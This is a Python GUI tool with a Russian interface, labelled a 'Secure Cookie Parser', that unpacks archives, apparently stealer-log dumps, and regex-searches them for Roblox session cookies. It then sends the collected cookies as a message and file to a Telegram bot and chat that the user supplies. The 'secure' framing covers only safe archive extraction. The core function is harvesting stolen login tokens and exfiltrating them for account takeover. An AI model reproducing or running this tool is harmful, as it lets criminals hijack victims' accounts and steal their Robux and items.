#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Secure Cookie Parser with GUI
Safe archive extraction and cookie parsing tool
"""

import os
import sys
import re
import time
import tempfile
import shutil
import zipfile
import tarfile
import rarfile
import sevenzipfile
from pathlib import Path
from datetime import datetime
from typing import Optional, List, Tuple
import threading

try:
    import tkinter as tk
    from tkinter import ttk, filedialog, messagebox
except ImportError:
    print("Tkinter is required. Install it with: sudo apt-get install python3-tk")
    sys.exit(1)

try:
    import requests
    TELEGRAM_AVAILABLE = True
except ImportError:
    TELEGRAM_AVAILABLE = False


class SecurityConfig:
    """Security configuration for safe file handling"""
    
    # Dangerous file extensions that should never be executed
    DANGEROUS_EXTENSIONS = {
        '.exe', '.bat', '.cmd', '.sh', '.ps1', '.vbs', '.js', '.jar',
        '.msi', '.dll', '.so', '.dylib', '.app', '.scr', '.pif'
    }
    
    # Maximum file size to process (100MB)
    MAX_FILE_SIZE = 100 * 1024 * 1024
    
    # Maximum extracted files
    MAX_FILES = 1000
    
    # Safe directory permissions (read-only for extracted files)
    SAFE_DIR_PERMISSIONS = 0o555  # Read and execute only


class SecureTempDirectory:
    """Context manager for secure temporary directory handling"""
    
    def __init__(self, prefix='secure_parser_'):
        self.temp_dir = None
        self.prefix = prefix
        self.original_dir = None
        
    def __enter__(self):
        # Create temp directory in system temp location
        self.temp_dir = tempfile.mkdtemp(prefix=self.prefix)
        
        # Set restrictive permissions
        try:
            os.chmod(self.temp_dir, SecurityConfig.SAFE_DIR_PERMISSIONS)
        except OSError:
            pass  # Some systems don't support chmod
            
        return self.temp_dir
        
    def __exit__(self, exc_type, exc_val, exc_tb):
        # Cleanup: remove the entire directory tree
        if self.temp_dir and os.path.exists(self.temp_dir):
            try:
                # Restore write permissions for cleanup
                for root, dirs, files in os.walk(self.temp_dir):
                    for d in dirs:
                        try:
                            os.chmod(os.path.join(root, d), 0o700)
                        except OSError:
                            pass
                    for f in files:
                        try:
                            os.chmod(os.path.join(root, f), 0o600)
                        except OSError:
                            pass
                
                shutil.rmtree(self.temp_dir, ignore_errors=True)
            except Exception:
                pass


class ArchiveHandler:
    """Safe archive extraction handler"""
    
    SUPPORTED_FORMATS = {
        '.zip': 'zip',
        '.tar': 'tar',
        '.gz': 'tar',
        '.bz2': 'tar',
        '.xz': 'tar',
        '.rar': 'rar',
        '.7z': '7z'
    }
    
    @staticmethod
    def is_safe_filename(filename: str) -> bool:
        """Check if filename is safe (no path traversal)"""
        # Prevent path traversal attacks
        if '..' in filename:
            return False
        if filename.startswith('/') or filename.startswith('\\'):
            return False
        if ':' in filename and os.name == 'nt':
            return False
        return True
    
    @staticmethod
    def is_safe_file(filepath: str) -> bool:
        """Check if file is safe to process"""
        # Check file size
        try:
            if os.path.getsize(filepath) > SecurityConfig.MAX_FILE_SIZE:
                return False
        except OSError:
            return False
            
        # Check extension
        ext = Path(filepath).suffix.lower()
        if ext in SecurityConfig.DANGEROUS_EXTENSIONS:
            return False
            
        return True
    
    @classmethod
    def extract_archive(cls, archive_path: str, extract_to: str, password: Optional[str] = None) -> Tuple[bool, str]:
        """
        Safely extract archive with password support
        Returns: (success, message)
        """
        try:
            path = Path(archive_path)
            ext = path.suffix.lower()
            
            if ext not in cls.SUPPORTED_FORMATS:
                # Try to detect format
                if ext == '.tgz':
                    archive_type = 'tar'
                else:
                    return False, f"Unsupported format: {ext}"
            else:
                archive_type = cls.SUPPORTED_FORMATS[ext]
            
            file_count = 0
            
            if archive_type == 'zip':
                with zipfile.ZipFile(archive_path, 'r') as zf:
                    for member in zf.namelist():
                        if not cls.is_safe_filename(member):
                            continue
                        if file_count >= SecurityConfig.MAX_FILES:
                            break
                        try:
                            zf.extract(member, extract_to, pwd=password.encode() if password else None)
                            file_count += 1
                        except Exception:
                            continue
                            
            elif archive_type == 'tar':
                mode = 'r:*'
                if password:
                    # Tar with password usually requires specific handling
                    mode = 'r'
                with tarfile.open(archive_path, mode) as tf:
                    for member in tf.getmembers():
                        if not cls.is_safe_filename(member.name):
                            continue
                        if file_count >= SecurityConfig.MAX_FILES:
                            break
                        try:
                            tf.extract(member, extract_to)
                            file_count += 1
                        except Exception:
                            continue
                            
            elif archive_type == 'rar':
                with rarfile.RarFile(archive_path, 'r') as rf:
                    for member in rf.namelist():
                        if not cls.is_safe_filename(member):
                            continue
                        if file_count >= SecurityConfig.MAX_FILES:
                            break
                        try:
                            rf.extract(member, extract_to, pwd=password)
                            file_count += 1
                        except Exception:
                            continue
                            
            elif archive_type == '7z':
                with sevenzipfile.SevenZipFile(archive_path, 'r') as szf:
                    for member in szf.getnames():
                        if not cls.is_safe_filename(member):
                            continue
                        if file_count >= SecurityConfig.MAX_FILES:
                            break
                        try:
                            szf.extractall(extract_to, password=password)
                            file_count += 1
                            break  # extractall extracts all at once
                        except Exception:
                            continue
            
            return True, f"Successfully extracted {file_count} files"
            
        except zipfile.BadZipFile:
            return False, "Invalid or corrupted ZIP file"
        except rarfile.BadRarFile:
            return False, "Invalid or corrupted RAR file"
        except Exception as e:
            if password and "password" in str(e).lower():
                return False, "Incorrect password"
            return False, f"Extraction error: {str(e)}"


class CookieParser:
    """Cookie file parser with pattern matching"""
    
    # Pattern for Roblox warning cookies
    COOKIE_PATTERN = re.compile(
        r'(_\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\._[^\s]*)'
    )
    
    def __init__(self):
        self.found_cookies = []
        self.files_processed = 0
        self.errors = []
        
    def parse_directory(self, directory: str) -> Tuple[List[str], int]:
        """
        Parse all files in directory for cookies
        Returns: (list of cookies, number of files processed)
        """
        self.found_cookies = []
        self.files_processed = 0
        
        try:
            for root, dirs, files in os.walk(directory):
                for filename in files:
                    filepath = os.path.join(root, filename)
                    
                    # Security check
                    if not SecureTempDirectory.is_safe_file(filepath) if hasattr(SecureTempDirectory, 'is_safe_file') else not ArchiveHandler.is_safe_file(filepath):
                        continue
                    
                    try:
                        # Only read text files
                        if self._is_text_file(filepath):
                            self._parse_file(filepath)
                        
                        self.files_processed += 1
                        
                    except Exception as e:
                        self.errors.append(f"Error reading {filename}: {str(e)}")
                        continue
                        
        except Exception as e:
            self.errors.append(f"Directory walk error: {str(e)}")
            
        return self.found_cookies, self.files_processed
    
    def _is_text_file(self, filepath: str) -> bool:
        """Check if file is likely a text file"""
        try:
            # Check file size first
            if os.path.getsize(filepath) > SecurityConfig.MAX_FILE_SIZE:
                return False
                
            # Try to read first few bytes
            with open(filepath, 'rb') as f:
                chunk = f.read(1024)
                # Check for null bytes (binary indicator)
                if b'\x00' in chunk:
                    return False
            return True
        except Exception:
            return False
    
    def _parse_file(self, filepath: str):
        """Parse single file for cookie patterns"""
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
                
            matches = self.COOKIE_PATTERN.findall(content)
            self.found_cookies.extend(matches)
            
        except Exception:
            # Try different encoding
            try:
                with open(filepath, 'r', encoding='latin-1', errors='ignore') as f:
                    content = f.read()
                matches = self.COOKIE_PATTERN.findall(content)
                self.found_cookies.extend(matches)
            except Exception:
                pass


class TelegramSender:
    """Telegram message sender"""
    
    def __init__(self, bot_token: str, chat_id: str):
        self.bot_token = bot_token
        self.chat_id = chat_id
        self.base_url = f"https://api.telegram.org/bot{bot_token}"
    
    def send_message(self, message: str, parse_mode: str = "HTML") -> bool:
        """Send text message to Telegram"""
        if not TELEGRAM_AVAILABLE:
            return False
            
        try:
            url = f"{self.base_url}/sendMessage"
            data = {
                'chat_id': self.chat_id,
                'text': message,
                'parse_mode': parse_mode
            }
            response = requests.post(url, json=data, timeout=10)
            return response.status_code == 200
        except Exception:
            return False
    
    def send_file(self, file_path: str, caption: str = "") -> bool:
        """Send file to Telegram"""
        if not TELEGRAM_AVAILABLE:
            return False
            
        try:
            url = f"{self.base_url}/sendDocument"
            with open(file_path, 'rb') as f:
                files = {'document': f}
                data = {
                    'chat_id': self.chat_id,
                    'caption': caption
                }
                response = requests.post(url, files=files, data=data, timeout=30)
            return response.status_code == 200
        except Exception:
            return False


class ParserGUI:
    """Main GUI application"""
    
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("Secure Cookie Parser")
        self.root.geometry("600x500")
        self.root.resizable(False, False)
        
        # Variables
        self.archive_path = tk.StringVar()
        self.has_password = tk.BooleanVar()
        self.password = tk.StringVar()
        self.bot_id = tk.StringVar()
        self.chat_id = tk.StringVar()
        self.status_var = tk.StringVar(value="Готов к работе")
        self.progress_var = tk.DoubleVar()
        
        self.setup_ui()
        self.setup_styles()
        
    def setup_styles(self):
        """Configure modern styles"""
        style = ttk.Style()
        
        # Configure colors
        bg_color = "#2b2b2b"
        fg_color = "#ffffff"
        accent_color = "#4a9eff"
        button_bg = "#3a3a3a"
        button_active = "#5a5a5a"
        
        style.theme_use('clam')
        
        # Frame style
        style.configure('TFrame', background=bg_color)
        style.configure('TLabel', background=bg_color, foreground=fg_color, font=('Arial', 10))
        style.configure('Title.TLabel', font=('Arial', 16, 'bold'), foreground=accent_color)
        style.configure('Status.TLabel', font=('Arial', 9), foreground='#888888')
        
        # Button style
        style.configure('TButton', 
                       background=button_bg, 
                       foreground=fg_color, 
                       font=('Arial', 11, 'bold'),
                       padding=10,
                       borderwidth=0,
                       focuscolor=accent_color)
        style.map('TButton',
                 background=[('active', button_active), ('pressed', accent_color)])
        
        # Entry style
        style.configure('TEntry', 
                       fieldbackground="#3a3a3a", 
                       foreground=fg_color,
                       borderwidth=0,
                       padding=5)
        
        # Progressbar style
        style.configure('TProgressbar', 
                       background=accent_color, 
                       troughcolor="#3a3a3a",
                       borderwidth=0)
        
        # Checkbutton style
        style.configure('TCheckbutton', 
                       background=bg_color, 
                       foreground=fg_color,
                       font=('Arial', 10))
        style.map('TCheckbutton',
                 background=[('active', bg_color)])
        
        self.root.configure(bg=bg_color)
        
    def setup_ui(self):
        """Setup user interface"""
        # Main container
        main_frame = ttk.Frame(self.root, padding="20")
        main_frame.pack(fill=tk.BOTH, expand=True)
        
        # Title
        title_label = ttk.Label(main_frame, text="🔐 Secure Cookie Parser", style='Title.TLabel')
        title_label.pack(pady=(0, 20))
        
        # Upload section
        upload_frame = ttk.Frame(main_frame)
        upload_frame.pack(fill=tk.X, pady=10)
        
        ttk.Label(upload_frame, text="Архив:").pack(side=tk.LEFT, padx=(0, 10))
        
        self.upload_entry = ttk.Entry(upload_frame, textvariable=self.archive_path, width=40)
        self.upload_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 10))
        
        self.upload_btn = ttk.Button(upload_frame, text="📁 Загрузить", command=self.browse_file)
        self.upload_btn.pack(side=tk.RIGHT)
        
        # Password section
        self.password_frame = ttk.Frame(main_frame)
        self.password_frame.pack(fill=tk.X, pady=10)
        
        self.password_check = ttk.Checkbutton(
            self.password_frame, 
            text="🔑 Есть пароль?",
            variable=self.has_password,
            command=self.toggle_password_field
        )
        self.password_check.pack(side=tk.LEFT)
        
        self.password_entry = ttk.Entry(self.password_frame, textvariable=self.password, show="*", width=30)
        self.password_entry.pack(side=tk.LEFT, padx=(10, 0))
        self.password_entry.config(state=tk.DISABLED)
        
        # Telegram section
        tg_frame = ttk.LabelFrame(main_frame, text="📤 Отправка в Telegram (опционально)", padding="10")
        tg_frame.pack(fill=tk.X, pady=10)
        
        ttk.Label(tg_frame, text="Bot ID:").grid(row=0, column=0, sticky=tk.W, pady=5)
        self.bot_entry = ttk.Entry(tg_frame, textvariable=self.bot_id, width=35)
        self.bot_entry.grid(row=0, column=1, padx=(10, 0), pady=5, sticky=tk.EW)
        
        ttk.Label(tg_frame, text="Chat ID:").grid(row=1, column=0, sticky=tk.W, pady=5)
        self.chat_entry = ttk.Entry(tg_frame, textvariable=self.chat_id, width=35)
        self.chat_entry.grid(row=1, column=1, padx=(10, 0), pady=5, sticky=tk.EW)
        
        tg_frame.columnconfigure(1, weight=1)
        
        # Start button
        self.start_btn = ttk.Button(main_frame, text="▶️ Начать", command=self.start_parsing)
        self.start_btn.pack(fill=tk.X, pady=20)
        
        # Progress section
        progress_frame = ttk.Frame(main_frame)
        progress_frame.pack(fill=tk.X, pady=10)
        
        self.progress_bar = ttk.Progressbar(progress_frame, variable=self.progress_var, maximum=100)
        self.progress_bar.pack(fill=tk.X)
        
        # Status label
        self.status_label = ttk.Label(main_frame, textvariable=self.status_var, style='Status.TLabel')
        self.status_label.pack(pady=(10, 0))
        
        # Results text area
        results_frame = ttk.LabelFrame(main_frame, text="📊 Результаты", padding="10")
        results_frame.pack(fill=tk.BOTH, expand=True, pady=10)
        
        self.results_text = tk.Text(results_frame, height=8, wrap=tk.WORD, 
                                   bg="#1e1e1e", fg="#ffffff", 
                                   font=('Consolas', 9),
                                   borderwidth=0, highlightthickness=0)
        self.results_text.pack(fill=tk.BOTH, expand=True)
        
        # Scrollbar
        scrollbar = ttk.Scrollbar(self.results_text, command=self.results_text.yview)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        self.results_text.config(yscrollcommand=scrollbar.set)
        
    def toggle_password_field(self):
        """Toggle password entry field"""
        if self.has_password.get():
            self.password_entry.config(state=tk.NORMAL)
        else:
            self.password_entry.config(state=tk.DISABLED)
            self.password.set("")
    
    def browse_file(self):
        """Open file browser dialog"""
        filetypes = [
            ("Archive files", "*.zip *.tar *.gz *.bz2 *.xz *.rar *.7z"),
            ("ZIP files", "*.zip"),
            ("TAR files", "*.tar *.tar.gz *.tar.bz2 *.tar.xz"),
            ("RAR files", "*.rar"),
            ("7Z files", "*.7z"),
            ("All files", "*.*")
        ]
        
        filename = filedialog.askopenfilename(
            title="Выберите архив",
            filetypes=filetypes
        )
        
        if filename:
            self.archive_path.set(filename)
            self.status_var.set(f"Файл выбран: {Path(filename).name}")
    
    def start_parsing(self):
        """Start the parsing process"""
        archive_path = self.archive_path.get()
        
        if not archive_path:
            messagebox.showerror("Ошибка", "Пожалуйста, выберите архив!")
            return
        
        if not os.path.exists(archive_path):
            messagebox.showerror("Ошибка", "Файл не найден!")
            return
        
        # Disable buttons during processing
        self.start_btn.config(state=tk.DISABLED)
        self.upload_btn.config(state=tk.DISABLED)
        
        # Start parsing in separate thread
        thread = threading.Thread(target=self.parsing_worker, daemon=True)
        thread.start()
    
    def parsing_worker(self):
        """Background worker for parsing"""
        try:
            start_time = time.time()
            
            # Update status
            self.root.after(0, lambda: self.status_var.set("Извлечение архива..."))
            self.root.after(0, lambda: self.progress_var.set(20))
            
            # Create secure temp directory
            with SecureTempDirectory() as temp_dir:
                # Extract archive
                password = self.password.get() if self.has_password.get() else None
                success, message = ArchiveHandler.extract_archive(
                    self.archive_path.get(), 
                    temp_dir, 
                    password
                )
                
                if not success:
                    self.root.after(0, lambda: messagebox.showerror("Ошибка", message))
                    self.root.after(0, lambda: self.status_var.set("Ошибка извлечения"))
                    self.root.after(0, lambda: self.progress_var.set(0))
                    self.root.after(0, lambda: self.start_btn.config(state=tk.NORMAL))
                    self.root.after(0, lambda: self.upload_btn.config(state=tk.NORMAL))
                    return
                
                self.root.after(0, lambda: self.progress_var.set(50))
                self.root.after(0, lambda: self.status_var.set("Парсинг файлов..."))
                
                # Parse for cookies
                parser = CookieParser()
                cookies, files_processed = parser.parse_directory(temp_dir)
                
                end_time = time.time()
                duration = end_time - start_time
                
                self.root.after(0, lambda: self.progress_var.set(80))
                self.root.after(0, lambda: self.status_var.set("Обработка результатов..."))
                
                # Prepare results
                result_message = self.format_results(cookies, duration, files_processed)
                
                # Display results
                self.root.after(0, lambda: self.display_results(result_message, cookies))
                
                # Send to Telegram if configured
                if self.bot_id.get() and self.chat_id.get() and cookies:
                    self.root.after(0, lambda: self.status_var.set("Отправка в Telegram..."))
                    self.send_to_telegram(cookies, result_message)
                
                self.root.after(0, lambda: self.progress_var.set(100))
                self.root.after(0, lambda: self.status_var.set(f"Готово! Проверено файлов: {files_processed}"))
                
        except Exception as e:
            self.root.after(0, lambda: messagebox.showerror("Критическая ошибка", str(e)))
            self.root.after(0, lambda: self.status_var.set("Произошла ошибка"))
            
        finally:
            self.root.after(0, lambda: self.start_btn.config(state=tk.NORMAL))
            self.root.after(0, lambda: self.upload_btn.config(state=tk.NORMAL))
    
    def format_results(self, cookies: List[str], duration: float, files_processed: int) -> str:
        """Format results for display and Telegram"""
        cookie_count = len(cookies)
        duration_ms = f"{duration:.3f}"
        
        message = f"""
╔══════════════════════════════════════╗
         📊 РЕЗУЛЬТАТЫ ПАРСИНГА         
╚══════════════════════════════════════╝

всего cookie: {cookie_count}
время проверки: {duration_ms} sec
обработано файлов: {files_processed}

═══════════════════════════════════════
"""
        return message
    
    def display_results(self, message: str, cookies: List[str]):
        """Display results in text area"""
        self.results_text.delete(1.0, tk.END)
        
        # Add formatted message
        self.results_text.insert(tk.END, message, 'header')
        
        # Add cookies in framed box
        if cookies:
            cookie_text = "\n".join(cookies[:100])  # Limit display
            self.results_text.insert(tk.END, f"\n{'='*50}\n", 'separator')
            self.results_text.insert(tk.END, "НАЙДЕННЫЕ COOKIE:\n", 'warning')
            self.results_text.insert(tk.END, f"{'='*50}\n\n", 'separator')
            self.results_text.insert(tk.END, cookie_text, 'cookie')
            
            if len(cookies) > 100:
                self.results_text.insert(tk.END, f"\n\n... и ещё {len(cookies) - 100} cookie", 'info')
        
        # Configure tags
        self.results_text.tag_config('header', foreground='#4a9eff', font=('Arial', 11, 'bold'))
        self.results_text.tag_config('warning', foreground='#ff6b6b', font=('Arial', 10, 'bold'))
        self.results_text.tag_config('cookie', foreground='#51cf66', font=('Consolas', 8))
        self.results_text.tag_config('separator', foreground='#666666')
        self.results_text.tag_config('info', foreground='#ffd43b', font=('Arial', 9, 'italic'))
    
    def send_to_telegram(self, cookies: List[str], message: str):
        """Send results to Telegram"""
        try:
            sender = TelegramSender(self.bot_id.get(), self.chat_id.get())
            
            # Send summary message
            sender.send_message(message)
            
            # Create cookie file
            cookie_content = "\n".join(cookies)
            
            with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
                f.write(cookie_content)
                temp_file = f.name
            
            try:
                # Send cookie file
                caption = f"🍪 Найдено cookie: {len(cookies)}\n⚠️ WARNING: DO NOT SHARE THIS!"
                sender.send_file(temp_file, caption)
            finally:
                # Cleanup temp file
                try:
                    os.unlink(temp_file)
                except Exception:
                    pass
                    
        except Exception as e:
            self.root.after(0, lambda: messagebox.showwarning("Telegram", f"Не удалось отправить: {str(e)}"))


def main():
    """Main entry point"""
    # Check for required libraries
    missing_libs = []
    
    try:
        import rarfile
    except ImportError:
        missing_libs.append('rarfile')
    
    try:
        import sevenzipfile
    except ImportError:
        missing_libs.append('sevenzipfile')
    
    if missing_libs:
        print("Missing libraries:", ', '.join(missing_libs))
        print("Install with: pip install " + ' '.join(missing_libs))
        print("\nContinuing without full archive support...")
    
    # Run GUI
    app = ParserGUI()
    app.root.mainloop()


if __name__ == "__main__":
    main()
